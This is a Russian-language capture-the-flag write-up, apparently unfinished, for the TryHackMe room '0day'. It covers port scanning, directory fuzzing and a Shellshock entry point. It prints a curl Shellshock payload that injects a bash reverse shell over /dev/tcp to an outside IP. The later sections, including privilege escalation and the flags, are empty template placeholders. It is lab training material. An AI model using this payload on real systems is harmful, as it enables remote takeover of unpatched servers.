# 0day

**Сложность:** Medium

<img width="100" height="100" alt="image" src="https://github.com/user-attachments/assets/6846478e-305b-4288-be7a-61f717ef11a8" />


| | |
|---|---|
| **Платформа** | TryHackMe |
| **Ссылка** | https://tryhackme.com/room/0day |
| **ОС** | Linux |
| **Теги** | `web`, `linux`, `shellshock`, `privesc`, `exploitation` |

## Кратко

Машина c открытыми 22 и 80 портом, на сервере в папке /cgi-bin лежит файл test.cgi - это shellshock, через него попадаем на машину под пользователем www-data. Узнаем версию Ubuntu 14.04.1 LTS, под которую выпущен эксплойт `'overlayfs' Local Privilege Escalation`, через который мы повышаем привилегии до root.

## 1. Разведка

### Сканирование портов

```bash
nmap -sV -p-65535 10.82.184.147
```

```
Starting Nmap 7.98 ( https://nmap.org ) at 2026-10-09 14:19 -0400
Nmap scan report for 10.82.184.147
Host is up (0.058s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.76 seconds
```

Обнаружил два открытых порта: 80, на котором стоит веб Apache httpd 2.4.7 ((Ubuntu)) и 22, ssh. Версии сервисов указывают,
что операционная система сервера скорее всего Ubuntu. 
### Перечисление сервисов

На 80 порту лежит обычная веб страничка. Пробую фаззить ее с помощью ffuf.
```bash
ffuf -u http://10.82.184.147/FUZZ -w /usr/share/wordlists/dirb/big.txt
```

```
.htaccess.php           [Status: 403, Size: 293, Words: 21, Lines: 11, Duration: 52ms]
.htpasswd               [Status: 403, Size: 289, Words: 21, Lines: 11, Duration: 52ms]
.htaccess               [Status: 403, Size: 289, Words: 21, Lines: 11, Duration: 53ms]
.htaccess               [Status: 403, Size: 289, Words: 21, Lines: 11, Duration: 52ms]
.htpasswd.php           [Status: 403, Size: 293, Words: 21, Lines: 11, Duration: 52ms]
.htpasswd               [Status: 403, Size: 289, Words: 21, Lines: 11, Duration: 52ms]
admin                   [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 68ms]
admin                   [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 68ms]
backup                  [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 55ms]
backup                  [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 55ms]
cgi-bin                 [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 55ms]
cgi-bin                 [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 56ms]
cgi-bin/                [Status: 403, Size: 288, Words: 21, Lines: 11, Duration: 50ms]
cgi-bin/                [Status: 403, Size: 288, Words: 21, Lines: 11, Duration: 52ms]
css                     [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 57ms]
css                     [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 58ms]
img                     [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 59ms]
img                     [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 59ms]
js                      [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 50ms]
js                      [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 50ms]
robots.txt              [Status: 200, Size: 38, Words: 7, Lines: 2, Duration: 52ms]
robots.txt              [Status: 200, Size: 38, Words: 7, Lines: 2, Duration: 52ms]
secret                  [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 55ms]
secret                  [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 55ms]
server-status           [Status: 403, Size: 293, Words: 21, Lines: 11, Duration: 59ms]
server-status           [Status: 403, Size: 293, Words: 21, Lines: 11, Duration: 59ms]
uploads                 [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 79ms]
uploads                 [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 80ms]
:: Progress: [61407/61407] :: Job [1/1] :: 727 req/sec :: Duration: [0:01:27] :: Errors: 0 ::
```
Наблюдаю пару интересных директорий: admin, backup, secret, uploads, cgi-bin. Разберу их по одной:
/admin - выдает просто белый экран, дальше;
/backup - файл с приватным ключом, зашифрованным паролем (я его расшифровал, но применить по ходу эксплуатации так и не довелось, хотя расшифровал, пробовал применить к существующим учетным записям);
/secret - фотография черепашки, ничего интересного, дальше;
/uploads - так же как и admin выдает белый экран, дальше;
/cgi-bin - интересная директория, обычно в ней лежат скрипты, такие как: .py, .sh, .cgi, pl. Напрямую доступ к ней запрещен, рассказал про нее в следующем пункте.

## 2. Получение доступа
Попробовав перебор файлов в /cgi-bin с помощью специально созданных для этой директории словарей, я нашел файл test.cgi, при открытии которого на страничке
Высвечивается надпись Hello World!. Это прямой указатель на уязвимость shellshock. 
Захожу на Payloads All The Things, ввожу в поиске shellshock и копирую пэйлоад `curl --silent -k -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.0.0.2/4444 0>&1" "https://10.0.0.1/cgi-bin/admin.cgi" `. Нужно его адаптировать под себя и применить:
Ввожу

**Флаг пользователя:** `flag`

## 3. Повышение привилегий

*(раздел опускается, если в машине нет отдельного этапа эскалации)*

Как был найден вектор повышения привилегий (linpeas, sudo -l, SUID, cron и т.д.) и как он эксплуатировался.

**Флаг root:** `flag`

## Выводы

- Какие уязвимости были использованы
- Как их можно было предотвратить
- Что стоит запомнить/чему научился

## Использованные инструменты

`nmap`, `gobuster`, `hydra`, ...
